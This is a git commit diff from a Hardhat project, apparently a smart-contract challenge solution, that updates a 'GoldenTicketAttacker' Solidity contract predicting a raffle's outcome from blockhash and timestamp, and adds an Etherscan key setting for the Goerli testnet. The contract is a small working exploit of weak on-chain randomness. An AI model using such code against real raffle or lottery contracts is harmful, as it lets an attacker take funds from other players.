c9f9c3790bcc25e6ee50ae5c2a376f0902f6ca3a
AlanRacciatti <alanracciatti1220@gmail.com>
2023-01-15 19:05:00 -0300

    feat: update exploit

--- contracts/GoldenTicketAttacker.sol
+++ contracts/GoldenTicketAttacker.sol
@@ -4,11 +4,13 @@ pragma solidity 0.8.17;
 /// @title The Golden Ticket Attacker
 /// @author https://twitter.com/AlanRacciatti
 contract GoldenTicketAttacker {
-    function getRaffleInput() external view returns (uint256 _guess) {
+    function getRaffleInput(uint256 _blockNumber, uint256 _timestamp)
+        external
+        view
+        returns (uint256 _guess)
+    {
         _guess = uint256(
-            keccak256(
-                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
-            )
+            keccak256(abi.encodePacked(blockhash(_blockNumber), _timestamp))
         );
     }
 }
--- hardhat.config.ts
+++ hardhat.config.ts
@@ -3,6 +3,7 @@ import "@nomicfoundation/hardhat-toolbox";
 require("dotenv").config();
 
 if (!process.env.PRIVATE_KEY) process.exit(1);
+if (!process.env.ETHERSCAN_API_KEY) process.exit(1);
 
 const config: HardhatUserConfig = {
   solidity: "0.8.17",
@@ -11,6 +12,11 @@ const config: HardhatUserConfig = {
       chainId: 5,
       url: process.env.GOERLI_RPC_URL,
       accounts: [process.env.PRIVATE_KEY],
+    },
+  },
+  etherscan: {
+    apiKey: {
+      goerli: process.env.ETHERSCAN_API_KEY,
     },
   },
 };
